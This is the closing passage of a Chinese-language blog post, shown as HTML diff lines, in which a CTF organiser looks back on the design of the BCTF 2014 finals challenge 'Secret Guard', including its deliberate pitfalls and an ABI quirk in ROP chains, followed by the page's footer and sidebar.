+<p>总体来看，虽然是一道不难的题目，但是还是花了不少心思来设计的，有些设计目标达到了，但是也很遗憾没有达到预期结果，特别是前面两个漏洞都没有人利用。</p>
+
+<p>题目中还设置了一些坑点，增加题目趣味性</p>
+
+<ul>
+<li>为了防止大家过于容易修改 flag 文件路径，我写了一个山寨 base64 解码得到文件地址。其实和程序逻辑没有什么关系，但是听说有队伍逆向了半天这个 base64，LOL</li>
+<li>为了防止大家抓包之后不经分析就直接重放流量，设置了两个障碍
+
+<ol>
+<li>各队 flag 各不相同，因此同样的流量，不能回答正确 16 个问题</li>
+<li>每次只能获取一个 byte 的信息，因此想回答 16 个问题，至少需要连接 16 次，这样抓包后，攻击流量就会在不同的 TCP stream 中，给分析流量造成一定困难。</li>
+</ol>
+</li>
+<li>另外，ROP chain 的构造中，还有设置 AL 寄存器为 0 的坑，这个不是故意设计的，而是 ABI 方面的坑</li>
+</ul>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">zTrix</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+<time datetime="2014-05-07T09:08:55+08:00" class="updated">Updated 2014-05-07</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/bctf/'>bctf</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://blog.ztrix.me/blog/2014/05/07/bctf-secret-guard/" data-via="_zTrix" data-counturl="http://blog.ztrix.me/blog/2014/05/07/bctf-secret-guard/" >Tweet</a>
+  
+  
+  <div class="g-plusone" data-size="medium"></div>
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/04/14/plaidctf-2014-parlor-writeup/" title="Previous Post: PlaidCTF 2014 - parlor (crypto 250) writeup">&laquo; PlaidCTF 2014 - parlor (crypto 250) writeup</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/05/07/bctf-secret-guard/">BCTF 2014 决赛题 - Secret Guard 回顾与分析</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/04/14/plaidctf-2014-parlor-writeup/">PlaidCTF 2014 - Parlor (Crypto 250) Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/04/10/codegate-ctf-final-2014-memory/">Codegate CTF Final 2014 Memory</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/03/29/star-and-thank-author-license/">Let's Make License Social! The Star and Thank Author License (SATA License)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/02/25/codegate-2014-weirdshark-writeup/">Codegate CTF 2014 Quals - Weirdshark Writeup</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/zTrix">@zTrix</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'zTrix',
+            count: 5,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section class="googleplus">
+  <h1>
+    <a href="https://plus.google.com/+wenleizhu?rel=author">
+      <img src="http://www.google.com/images/icons/ui/gprofile_button-32.png" width="32" height="32">
+      Google+
+    </a>
+  </h1>
+</section>
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - zTrix -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'ztrix-blog';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://blog.ztrix.me/blog/2014/05/07/bctf-secret-guard/';
+        var disqus_url = 'http://blog.ztrix.me/blog/2014/05/07/bctf-secret-guard/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
+      script.src = 'https://apis.google.com/js/plusone.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
+    })();
+  </script>
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
